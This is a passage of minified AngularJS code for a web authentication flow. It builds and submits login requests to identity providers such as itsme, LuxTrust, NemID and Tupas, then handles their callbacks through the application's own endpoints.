enableFtnForm(){ValButton.setDisable(!1),$scope.ftnAction=$sce.trustAsResourceUrl(ftnAction),$scope.ftnMethod="GET",ftnData=JSON.parse(ftnData),$scope.ftnForm.client_id=ftnData.client_id,$scope.ftnForm.scope=ftnData.scope,$scope.ftnForm.redirect_uri=$sce.trustAsResourceUrl(ftnData.redirect_uri),$scope.ftnForm.response_type=ftnData.response_type,$scope.ftnForm.response_mode=ftnData.response_mode,$scope.ftnForm.nonce=ftnData.nonce,$scope.ftnForm.state=ftnData.state,$scope.ftnForm.prompt=ftnData.prompt,$scope.ftnForm.code_challenge=ftnData.code_challenge,$scope.ftnForm.code_challenge_method=ftnData.code_challenge_method,$scope.ftnForm.login_hint=ftnData.login_hint,$scope.ftnForm.ui_locales=ftnData.ui_locales,$scope.ftnForm.acr_values=ftnData.acr_values,SplashScreen.hide()}ValButton.setDisable(!0),_.isEmpty(ftnData)?Ftn.load().then(function(){ftnData=ThisService.data[$rootScope.uniqueId].authRequestData,ftnAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue,enableFtnForm()}):enableFtnForm(),ValButton.setAction(function(){ThisService.data[$rootScope.uniqueId].callbackLang=$translate.proposedLanguage()||$translate.use(),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENTICATION_IN_PROGRESS),$unloadEvent.disable(),document.getElementById("formFtn").submit()})}]);ACS_COMMONS=angular.module("ACS3");ACS3.directive("itsmeCallback",function(){return{restrict:"E",controller:"ItsmeCallbackCtrl"}}),ACS3.controller("ItsmeCallbackCtrl",["$scope","$rootScope","ThisService","UserExperienceService","$state","AuthentPagesService","MessageBanner","$timeout","CnButton","$http","$q","$translate","APP_STATES",function($scope,$rootScope,ThisService,UserExperienceService,$state,AuthentPagesService,MessageBanner,$timeout,CnButton,$http,$q,$translate,APP_STATES){$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;var str,callbackResponse={success:$state.params.success?(str=$state.params.success,decodeURIComponent(Array.prototype.map.call(atob(str),function(c){return"%"+("00"+c.charCodeAt(0).toString(16)).slice(-2)}).join(""))):void 0,error:$state.params.error,cancelled:$state.params.cancelled},endAuthentication=function(){var authentInput,endAuthentication={};endAuthentication.accountId=ThisService.data[$rootScope.uniqueId].accountId,endAuthentication.hubAuthenticationInput={},authentInput=endAuthentication,$http.post("authent/itsme/endAuthent",authentInput,{"Content-Type":"application/json; charset=UTF-8"}).then(function(response){return response.data},function(response){return response.data}).then(function(){ThisService.killSession(),ThisService.readyExit(),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)})},language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){if(callbackResponse.success){UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS);var updateAuthentInput={accountId:ThisService.data[$rootScope.uniqueId].accountId,hubAuthenticationInput:{chosenMeans:"ITSME",otp:callbackResponse.success}};AuthentPagesService.updateAuthentication(updateAuthentInput).then(function(hubResponse){hubResponse.hubAuthenticationOutput.authenticationSuccess?MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS):(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_REFUSAL)),endAuthentication()})}else callbackResponse.cancelled?CnButton.action():(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),endAuthentication())})}]),(ACS3=angular.module("ACS3")).directive("itsmeForm",function(){return{restrict:"E",scope:{target:"@"},templateUrl:"app/directives/ItsmeForm/itsmeForm.html",controller:"ItsmeFormCtrl"}}),ACS3.factory("Itsme",["$rootScope","ThisService","LOCALES","AuthentPagesService","$translate",function($rootScope,ThisService,LOCALES,AuthentPagesService,$translate){return{load:function(){var newAuthent={};newAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,newAuthent.hubAuthenticationInput={};var language=$translate.proposedLanguage()||$translate.use();return newAuthent.language=language,LOCALES.availableLocales.hasOwnProperty(language)&&(newAuthent.region=LOCALES.availableLocales[language].region),newAuthent.hubAuthenticationInput.transactionContext={},AuthentPagesService.startAuthentication(newAuthent).then(function(hubResponse){ThisService.data.callbackId=$rootScope.uniqueId,ThisService.data[$rootScope.uniqueId].hubAuthentId=hubResponse.hubAuthenticationOutput.id,ThisService.data[$rootScope.uniqueId].authRequestData=hubResponse.hubAuthenticationOutput.authRequestData,ThisService.data[$rootScope.uniqueId].chosenDeviceValue=hubResponse.hubAuthenticationOutput.chosenDeviceValue})}}}]),ACS3.controller("ItsmeFormCtrl",["$scope","$rootScope","ValButton","$sce","ThisService","Itsme","SplashScreen","MessageBanner","$unloadEvent","$translate",function($scope,$rootScope,ValButton,$sce,ThisService,Itsme,SplashScreen,MessageBanner,$unloadEvent,$translate){$scope.itsmeForm={},$scope.itsmeAction={},$scope.target=angular.isDefined($scope.target)?$scope.target:"_blank";var itsmeData=ThisService.data[$rootScope.uniqueId].authRequestData,itsmeAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue;$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;function enableItsmeForm(){ValButton.setDisable(!1),$scope.itsmeAction=$sce.trustAsResourceUrl(itsmeAction),$scope.itsmeMethod="GET",itsmeData=JSON.parse(itsmeData),$scope.itsmeForm.client_id=itsmeData.client_id,$scope.itsmeForm.scope=itsmeData.scope,$scope.itsmeForm.redirect_uri=$sce.trustAsResourceUrl(itsmeData.redirect_uri),$scope.itsmeForm.response_type=itsmeData.response_type,$scope.itsmeForm.state=itsmeData.state,$scope.itsmeForm.request_uri=$sce.trustAsResourceUrl(itsmeData.request_uri),SplashScreen.hide()}ValButton.setDisable(!0),_.isEmpty(itsmeData)?Itsme.load().then(function(){itsmeData=ThisService.data[$rootScope.uniqueId].authRequestData,itsmeAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue,enableItsmeForm()}):enableItsmeForm(),ValButton.setAction(function(){ThisService.data[$rootScope.uniqueId].callbackLang=$translate.proposedLanguage()||$translate.use(),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENTICATION_IN_PROGRESS),$unloadEvent.disable(),document.getElementById("formItsme").submit()})}]);ACS_COMMONS=angular.module("ACS3");ACS3.directive("luxtrustCallback",function(){return{restrict:"E",controller:"LuxtrustCallbackCtrl"}}),ACS3.controller("LuxtrustCallbackCtrl",["$scope","$rootScope","ThisService","UserExperienceService","$state","MessageBanner","$timeout","$http","$q","$translate","APP_STATES","CnButton",function($scope,$rootScope,ThisService,UserExperienceService,$state,MessageBanner,$timeout,$http,$q,$translate,APP_STATES,CnButton){$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;var callbackResponse_success=$state.params.success;$state.params.error;CnButton.setDisable(!0);var endAuthentication=function(){var authentInput,endAuthentication={};endAuthentication.accountId=ThisService.data[$rootScope.uniqueId].accountId,endAuthentication.hubAuthenticationInput={},authentInput=endAuthentication,$http.post("authent/luxtrust/endAuthent",authentInput,{"Content-Type":"application/json; charset=UTF-8"}).then(function(response){return response.data},function(response){return response.data}).then(function(){ThisService.killSession(),ThisService.readyExit(),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)})},language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){if(callbackResponse_success){var updateAuthentInput={language:language,accountId:ThisService.data[$rootScope.uniqueId].accountId,hubAuthenticationInput:{chosenMeans:"LUXTRUST_REDIR"}};authentInput=updateAuthentInput,$http.post("authent/luxtrust/updateAuthent",authentInput,{"Content-Type":"application/json; charset=UTF-8"}).then(function(response){return response.data},function(response){return response.data}).then(function(hubResponse){hubResponse.hubAuthenticationOutput.authenticationSuccess?(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS)):hubResponse.hubAuthenticationOutput.authenticationCanceled?(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TRANSACTION_CANCELLED)):hubResponse.hubAuthenticationOutput.authenticationFailed?(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_FAILURE)):(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_REFUSAL)),endAuthentication()})}else UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_FAILURE),endAuthentication();var authentInput})}]),(ACS3=angular.module("ACS3")).directive("luxtrustForm",function(){return{restrict:"E",scope:{target:"@",autoload:"@"},templateUrl:"app/directives/LuxtrustForm/luxtrustForm.html",controller:"LuxtrustFormCtrl"}}),ACS3.factory("Luxtrust",["$rootScope","ThisService","LOCALES","AuthentPagesService","$translate",function($rootScope,ThisService,LOCALES,AuthentPagesService,$translate){return{load:function(){var newAuthent={};newAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,newAuthent.hubAuthenticationInput={};var language=$translate.proposedLanguage()||$translate.use();return newAuthent.language=language,LOCALES.availableLocales.hasOwnProperty(language)&&(newAuthent.region=LOCALES.availableLocales[language].region),newAuthent.hubAuthenticationInput.transactionContext={},AuthentPagesService.startAuthentication(newAuthent).then(function(hubResponse){ThisService.data.callbackId=$rootScope.uniqueId,ThisService.data[$rootScope.uniqueId].hubAuthentId=hubResponse.hubAuthenticationOutput.id,ThisService.data[$rootScope.uniqueId].authRequestData=hubResponse.hubAuthenticationOutput.authRequestData,ThisService.data[$rootScope.uniqueId].chosenDeviceValue=hubResponse.hubAuthenticationOutput.chosenDeviceValue})}}}]),ACS3.controller("LuxtrustFormCtrl",["$scope","$rootScope","ValButton","$sce","ThisService","Luxtrust","SplashScreen","MessageBanner","$unloadEvent","$translate","$timeout","$window",function($scope,$rootScope,ValButton,$sce,ThisService,Luxtrust,SplashScreen,MessageBanner,$unloadEvent,$translate,$timeout,$window){$scope.luxtrustForm={},$scope.luxtrustAction={},$scope.target=angular.isDefined($scope.target)?$scope.target:"_self",$scope.autoload=angular.isDefined($scope.autoload)?$scope.autoload:"false";var luxtrustData=ThisService.data[$rootScope.uniqueId].authRequestData,luxtrustAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue;$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;function enableLuxtrustForm(){$scope.luxtrustAction=$sce.trustAsResourceUrl(luxtrustAction),$scope.luxtrustForm.samlRequest=luxtrustData,ValButton.setDisable(!1),"true"==$scope.autoload&&$timeout(function(){ThisService.data[$rootScope.uniqueId].callbackLang=$translate.proposedLanguage()||$translate.use(),$unloadEvent.disable(),document.getElementById("formLuxtrust").submit()}),SplashScreen.hide()}ValButton.setDisable(!0),_.isEmpty(luxtrustData)?Luxtrust.load().then(function(){luxtrustData=ThisService.data[$rootScope.uniqueId].authRequestData,luxtrustAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue,enableLuxtrustForm()}):enableLuxtrustForm(),ValButton.setAction(function(){ThisService.data[$rootScope.uniqueId].callbackLang=$translate.proposedLanguage()||$translate.use(),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENTICATION_IN_PROGRESS),$unloadEvent.disable(),document.getElementById("formLuxtrust").submit()});var iframe=document.getElementById("lux-iframe"),iframeConf={iframeTouched:!1};["mouseover","pointermove","mspointermove","touchstart"].forEach(function(event){iframe.addEventListener(event,function(){iframeConf.iframeTouched=!0})}),["mouseout","touchend"].forEach(function(event){iframe.addEventListener(event,function(){iframeConf.iframeTouched=!1})}),"_self"!==$scope.target&&($window.addEventListener("message",function(event){_.startsWith(event.data,"redirect")&&$window.location.replace(event.data.replace("redirect:",""))}),$window.addEventListener("blur",function(){iframeConf.iframeTouched&&(ThisService.data[$rootScope.uniqueId].callbackLang=$translate.proposedLanguage()||$translate.use())}))}]);ACS_COMMONS=angular.module("ACS3");ACS3.directive("nemIdCallback",function(){return{restrict:"E",controller:"NemIdCallbackCtrl"}}),ACS3.controller("NemIdCallbackCtrl",["$scope","$rootScope","ThisService","UserExperienceService","$state","AuthentPagesService","MessageBanner","$timeout","CnButton","$http","$q","$translate","APP_STATES",function($scope,$rootScope,ThisService,UserExperienceService,$state,AuthentPagesService,MessageBanner,$timeout,CnButton,$http,$q,$translate,APP_STATES){$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;var str,callbackResponse={success:$state.params.success?(str=$state.params.success,decodeURIComponent(Array.prototype.map.call(atob(str),function(c){return"%"+("00"+c.charCodeAt(0).toString(16)).slice(-2)}).join(""))):void 0,error:$state.params.error,cancelled:$state.params.cancelled},endAuthentication=function(){var authentInput,endAuthentication={};endAuthentication.accountId=ThisService.data[$rootScope.uniqueId].accountId,endAuthentication.hubAuthenticationInput={},authentInput=endAuthentication,$http.post("authent/nemid/endAuthent",authentInput,{"Content-Type":"application/json; charset=UTF-8"}).then(function(response){return response.data},function(response){return response.data}).then(function(){ThisService.killSession(),ThisService.readyExit(),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)})},language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){if(callbackResponse.success){UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS);var updateAuthentInput={accountId:ThisService.data[$rootScope.uniqueId].accountId,hubAuthenticationInput:{chosenMeans:"NEMID",otp:callbackResponse.success}};AuthentPagesService.updateAuthentication(updateAuthentInput).then(function(hubResponse){hubResponse.hubAuthenticationOutput.authenticationSuccess?MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS):(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_REFUSAL)),endAuthentication()})}else callbackResponse.cancelled?CnButton.action():(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),endAuthentication())})}]),(ACS3=angular.module("ACS3")).directive("nemIdForm",function(){return{restrict:"E",templateUrl:"app/directives/NemIdForm/nemIdForm.html",controller:"NemIdFormCtrl"}}),ACS3.factory("NemId",["$rootScope","ThisService","LOCALES","AuthentPagesService","$translate",function($rootScope,ThisService,LOCALES,AuthentPagesService,$translate){return{load:function(){var newAuthent={};newAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,newAuthent.hubAuthenticationInput={};var language=$translate.proposedLanguage()||$translate.use();return newAuthent.language=language,LOCALES.availableLocales.hasOwnProperty(language)&&(newAuthent.region=LOCALES.availableLocales[language].region),newAuthent.hubAuthenticationInput.transactionContext={},AuthentPagesService.startAuthentication(newAuthent).then(function(hubResponse){ThisService.data.callbackId=$rootScope.uniqueId,ThisService.data[$rootScope.uniqueId].hubAuthentId=hubResponse.hubAuthenticationOutput.id,ThisService.data[$rootScope.uniqueId].authRequestData=hubResponse.hubAuthenticationOutput.authRequestData,ThisService.data[$rootScope.uniqueId].chosenDeviceValue=hubResponse.hubAuthenticationOutput.chosenDeviceValue})}}}]),ACS3.controller("NemIdFormCtrl",["$scope","$rootScope","ValButton","$sce","ThisService","NemId","SplashScreen","MessageBanner","$unloadEvent","$translate",function($scope,$rootScope,ValButton,$sce,ThisService,NemId,SplashScreen,MessageBanner,$unloadEvent,$translate){$scope.nemIdForm={},$scope.nemIdAction={};var nemIdData=ThisService.data[$rootScope.uniqueId].authRequestData,nemIdAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue;$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;function enableNemIdForm(){ValButton.setDisable(!1),$scope.nemIdAction=$sce.trustAsResourceUrl(nemIdAction),$scope.nemIdMethod="GET",nemIdData=JSON.parse(nemIdData),$scope.nemIdForm.client_id=nemIdData.client_id,$scope.nemIdForm.scope=nemIdData.scope,$scope.nemIdForm.redirect_uri=$sce.trustAsResourceUrl(nemIdData.redirect_uri),$scope.nemIdForm.response_type=nemIdData.response_type,$scope.nemIdForm.response_mode=nemIdData.response_mode,$scope.nemIdForm.nonce=nemIdData.nonce,$scope.nemIdForm.state=nemIdData.state,$scope.nemIdForm.prompt=nemIdData.prompt,$scope.nemIdForm.login_hint=nemIdData.login_hint,$scope.nemIdForm.ui_locales=nemIdData.ui_locales,$scope.nemIdForm.acr_values=nemIdData.acr_values,SplashScreen.hide()}ValButton.setDisable(!0),_.isEmpty(nemIdData)?NemId.load().then(function(){nemIdData=ThisService.data[$rootScope.uniqueId].authRequestData,nemIdAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue,enableNemIdForm()}):enableNemIdForm(),ValButton.setAction(function(){ThisService.data[$rootScope.uniqueId].callbackLang=$translate.proposedLanguage()||$translate.use(),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENTICATION_IN_PROGRESS),$unloadEvent.disable(),document.getElementById("formNemId").submit()})}]);ACS_COMMONS=angular.module("ACS3");ACS3.directive("opOpenIdCallback",function(){return{restrict:"E",controller:"OpOpenIdCallbackCtrl"}}),ACS3.controller("OpOpenIdCallbackCtrl",["$scope","$rootScope","ThisService","UserExperienceService","$state","AuthentPagesService","MessageBanner","$timeout","CnButton","$http","$q","$translate","APP_STATES",function($scope,$rootScope,ThisService,UserExperienceService,$state,AuthentPagesService,MessageBanner,$timeout,CnButton,$http,$q,$translate,APP_STATES){$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;var str,callbackResponse={success:$state.params.success?(str=$state.params.success,decodeURIComponent(Array.prototype.map.call(atob(str),function(c){return"%"+("00"+c.charCodeAt(0).toString(16)).slice(-2)}).join(""))):void 0,error:$state.params.error,cancelled:$state.params.cancelled},endAuthentication=function(){var authentInput,endAuthentication={};endAuthentication.accountId=ThisService.data[$rootScope.uniqueId].accountId,endAuthentication.hubAuthenticationInput={},authentInput=endAuthentication,$http.post("authent/opopenid/endAuthent",authentInput,{"Content-Type":"application/json; charset=UTF-8"}).then(function(response){return response.data},function(response){return response.data}).then(function(){ThisService.killSession(),ThisService.readyExit(),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)})},language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){if(callbackResponse.success){UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS);var updateAuthentInput={accountId:ThisService.data[$rootScope.uniqueId].accountId,hubAuthenticationInput:{chosenMeans:"OPOPID",otp:callbackResponse.success}};AuthentPagesService.updateAuthentication(updateAuthentInput).then(function(hubResponse){hubResponse.hubAuthenticationOutput.authenticationSuccess?MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS):(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_REFUSAL)),endAuthentication()})}else callbackResponse.cancelled?CnButton.action():(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),endAuthentication())})}]),(ACS3=angular.module("ACS3")).directive("opOpenIdForm",function(){return{restrict:"E",templateUrl:"app/directives/OpOpenIdForm/OpOpenIdForm.html",controller:"OpOpenIdFormCtrl"}}),ACS3.factory("OpOpenId",["$rootScope","ThisService","LOCALES","AuthentPagesService","$translate",function($rootScope,ThisService,LOCALES,AuthentPagesService,$translate){return{load:function(){var newAuthent={};newAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,newAuthent.hubAuthenticationInput={};var language=$translate.proposedLanguage()||$translate.use();return newAuthent.language=language,LOCALES.availableLocales.hasOwnProperty(language)&&(newAuthent.region=LOCALES.availableLocales[language].region),newAuthent.hubAuthenticationInput.transactionContext={},AuthentPagesService.startAuthentication(newAuthent).then(function(hubResponse){ThisService.data.callbackId=$rootScope.uniqueId,ThisService.data[$rootScope.uniqueId].hubAuthentId=hubResponse.hubAuthenticationOutput.id,ThisService.data[$rootScope.uniqueId].authRequestData=hubResponse.hubAuthenticationOutput.authRequestData,ThisService.data[$rootScope.uniqueId].chosenDeviceValue=hubResponse.hubAuthenticationOutput.chosenDeviceValue})}}}]),ACS3.controller("OpOpenIdFormCtrl",["$scope","$rootScope","ValButton","$sce","ThisService","OpOpenId","SplashScreen","MessageBanner","$unloadEvent","$translate",function($scope,$rootScope,ValButton,$sce,ThisService,OpOpenId,SplashScreen,MessageBanner,$unloadEvent,$translate){$scope.OpOpenIdForm={},$scope.OpOpenIdAction={};var OpOpenIdData=ThisService.data[$rootScope.uniqueId].authRequestData,OpOpenIdAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue;$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;function enableOpOpenIdForm(){ValButton.setDisable(!1),$scope.OpOpenIdAction=$sce.trustAsResourceUrl(OpOpenIdAction),$scope.OpOpenIdMethod="GET",OpOpenIdData=JSON.parse(OpOpenIdData),$scope.OpOpenIdForm.client_id=OpOpenIdData.client_id,$scope.OpOpenIdForm.redirect_uri=$sce.trustAsResourceUrl(OpOpenIdData.redirect_uri),$scope.OpOpenIdForm.response_type=OpOpenIdData.response_type,$scope.OpOpenIdForm.state=OpOpenIdData.state,$scope.OpOpenIdForm.scope=OpOpenIdData.scope,$scope.OpOpenIdForm.nonce=OpOpenIdData.nonce,$scope.OpOpenIdForm.request=OpOpenIdData.request,SplashScreen.hide()}ValButton.setDisable(!0),_.isEmpty(OpOpenIdData)?OpOpenId.load().then(function(){OpOpenIdData=ThisService.data[$rootScope.uniqueId].authRequestData,OpOpenIdAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue,enableOpOpenIdForm()}):enableOpOpenIdForm(),ValButton.setAction(function(){ThisService.data[$rootScope.uniqueId].callbackLang=$translate.proposedLanguage()||$translate.use(),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENTICATION_IN_PROGRESS),$unloadEvent.disable(),document.getElementById("formOpOpenId").submit()})}]);ACS3=angular.module("ACS3");var SplashMode=Object.freeze({BLANK:0,ENTER_MESSAGE:1,EXIT_MESSAGE:2});ACS3.factory("SplashScreen",["$rootScope",function($rootScope){return{show:!0,splashMode:SplashMode.ENTER_MESSAGE,showTexts:!1,subscribe:function(scope,callback){var handler=$rootScope.$on("update-splash-screen",callback);scope.$on("$destroy",handler)},hide:function(){this.show=!1,$rootScope.$emit("update-splash-screen")},splash:function(splashMode){this.show=!0,this.splashMode=splashMode,$rootScope.$emit("update-splash-screen")}}}]),ACS3.directive("splashScreen",function(){return{restrict:"E",scope:{show:"@?"},templateUrl:"app/directives/SplashScreen/splashScreen.html",controller:"SplashScreenCtrl"}}),ACS3.controller("SplashScreenCtrl",["$scope","SplashScreen","ThisService","I18N",function($scope,SplashScreen,ThisService,I18N){$scope.adBlockMessage=window.ACS_AD_BLOCK_ENABLED,$scope.showTexts=SplashScreen.showTexts,$scope.updateSplashScreen=function(){$scope.show=SplashScreen.show,$scope.splashMode=SplashScreen.splashMode},$scope.updateSplashScreen(),SplashScreen.subscribe($scope,function(){$scope.updateSplashScreen()}),I18N.subscribe($scope,function(){ThisService.whenCustomItemsReady(I18N.defaultLocale).then(function(){$scope.showTexts=!0})}),$scope.spinnerOpts={lines:9,length:3,width:12,radius:20,scale:1,corners:.8,color:"#000",opacity:.25,rotate:0,direction:1,speed:1,trail:60,fps:20,zIndex:2e9,className:"spinner",top:"50px",left:"50%",shadow:!1,hwaccel:!1,position:"relative"}}]);ACS_COMMONS=angular.module("ACS3");ACS3.directive("tupasCallback",function(){return{restrict:"E",controller:"TupasCallbackCtrl"}}),ACS3.controller("TupasCallbackCtrl",["$scope","$rootScope","ThisService","UserExperienceService","$state","AuthentPagesService","MessageBanner","$timeout","CnButton","$http","$q","$translate","APP_STATES",function($scope,$rootScope,ThisService,UserExperienceService,$state,AuthentPagesService,MessageBanner,$timeout,CnButton,$http,$q,$translate,APP_STATES){$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;var str,callbackResponse={success:$state.params.success?(str=$state.params.success,decodeURIComponent(Array.prototype.map.call(atob(str),function(c){return"%"+("00"+c.charCodeAt(0).toString(16)).slice(-2)}).join(""))):void 0,error:$state.params.error,cancelled:$state.params.cancelled},endAuthentication=function(){var authentInput,endAuthentication={};endAuthentication.accountId=ThisService.data[$rootScope.uniqueId].accountId,endAuthentication.hubAuthenticationInput={},authentInput=endAuthentication,$http.post("authent/tupas/endAuthent",authentInput,{"Content-Type":"application/json; charset=UTF-8"}).then(function(response){return response.data},function(response){return response.data}).then(function(){ThisService.killSession(),ThisService.readyExit(),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)})},language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){if(callbackResponse.success){UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS);var updateAuthentInput={language:language,accountId:ThisService.data[$rootScope.uniqueId].accountId,hubAuthenticationInput:{chosenMeans:"TUPAS",otp:callbackResponse.success}};AuthentPagesService.updateAuthentication(updateAuthentInput).then(function(hubResponse){hubResponse.hubAuthenticationOutput.authenticationSuccess?MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS):(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_REFUSAL)),endAuthentication()})}else callbackResponse.cancelled?CnButton.action():(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_FAILURE),endAuthentication())})}]),(ACS3=angular.module("ACS3")).directive("tupasForm",function(){return{restrict:"E",templateUrl:"app/directives/TupasForm/tupasForm.html",controller:"TupasFormCtrl"}}),ACS3.factory("Tupas",["$rootScope","ThisService","LOCALES","AuthentPagesService","$translate",function($rootScope,ThisService,LOCALES,AuthentPagesService,$translate){return{load:function(){var newAuthent={};newAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,newAuthent.hubAuthenticationInput={};var language=$translate.proposedLanguage()||$translate.use();return newAuthent.language=language,LOCALES.availableLocales.hasOwnProperty(language)&&(newAuthent.region=LOCALES.availableLocales[language].region),newAuthent.hubAuthenticationInput.transactionContext={},AuthentPagesService.startAuthentication(newAuthent).then(function(hubResponse){ThisService.data.callbackId=$rootScope.uniqueId,ThisService.data[$rootScope.uniqueId].hubAuthentId=hubResponse.hubAuthenticationOutput.id,ThisService.data[$rootScope.uniqueId].authRequestData=hubResponse.hubAuthenticationOutput.authRequestData,ThisService.data[$rootScope.uniqueId].chosenDeviceValue=hubResponse.hubAuthenticationOutput.chosenDeviceValue})}}}]),ACS3.controller("TupasFormCtrl",["$scope","$rootScope","ValButton","$sce","ThisService","Tupas","SplashScreen","MessageBanner","$unloadEvent","$translate",function($scope,$rootScope,ValButton,$sce,ThisService,Tupas,SplashScreen,MessageBanner,$unloadEvent,$translate){$scope.tupasForm={},$scope.tupasAction={},$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;function 